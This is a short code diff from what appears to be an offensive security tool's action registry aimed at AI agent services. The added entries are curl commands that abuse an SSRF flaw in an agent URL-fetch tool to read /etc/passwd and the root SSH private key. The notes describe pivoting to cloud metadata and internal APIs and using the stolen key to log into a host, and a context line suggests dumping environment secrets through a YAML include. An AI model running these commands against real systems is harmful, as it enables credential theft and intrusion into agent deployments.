@@ -538,6 +538,21 @@ ACTION_REGISTRY: dict[str, Action] = {
         note="Unsafe YAML deserialization: a custom !include tag reads any absolute path. "
              "Try /proc/self/environ to dump the worker's env secrets."),
 
+    # --- AI: agent egress-proxy SSRF (file:// / no allowlist) ---
+    "probe_ssrf_egress_proxy": _a("probe_ssrf_egress_proxy",
+        ["# an agent 'egress proxy' / URL-fetch tool with no scheme/host allowlist:",
+         "curl -sk -G $URL/api/try --data-urlencode 'url=file:///etc/passwd'"],
+        outputs="raw",
+        note="LLM06 tool SSRF: the fetch tool accepts file:// (and internal hosts). A passwd/"
+             "private-key body confirms SSRF->LFI."),
+    "exploit_ssrf_file_read": _a("exploit_ssrf_file_read",
+        ["# read arbitrary local files / private keys through the same tool (foothold key):",
+         "curl -sk -G $URL/api/try --data-urlencode 'url=file:///root/.ssh/id_rsa'",
+         "# also pivot the SSRF at internal services / cloud metadata (169.254.169.254)."],
+        risk="propose", runnable=False, outputs="raw",
+        note="Read the deploy/SSH private key named by the A2A card (/.well-known/agent.json), then "
+             "SSH to the named host. Same primitive reaches internal APIs + IMDS."),
+
     # --- AI advanced: OpenAPI surface discovery ---
     "probe_openapi_spec": _a("probe_openapi_spec",
         ["for p in /openapi.json /swagger.json /api-docs /docs /redoc /swagger-ui.html "
